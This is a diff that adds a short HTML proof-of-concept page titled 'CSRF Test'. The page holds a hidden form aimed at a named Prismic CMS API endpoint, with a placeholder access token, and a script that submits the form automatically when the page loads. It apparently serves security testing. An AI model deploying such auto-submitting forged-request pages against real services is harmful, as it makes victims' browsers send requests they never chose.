@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CSRF Test</h1>
+    <form action="https://nimiq.cdn.prismic.io/api/v2/documents/search" method="GET">
+      <input type="hidden" name="q" value='[[at(document.type, "stakingValues")]]'>
+      <input type="hidden" name="ref" value="Z7brfREAACUA07Dk">
+      <input type="hidden" name="access_token" value="YOUR_VALID_ACCESS_TOKEN">
+      <input type="hidden" name="x-c" value="js-7.15.1">
+      <button type="submit">Click me!</button>
+    </form>
+    <script>
+      // Automatically submit the form without the user needing to click
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
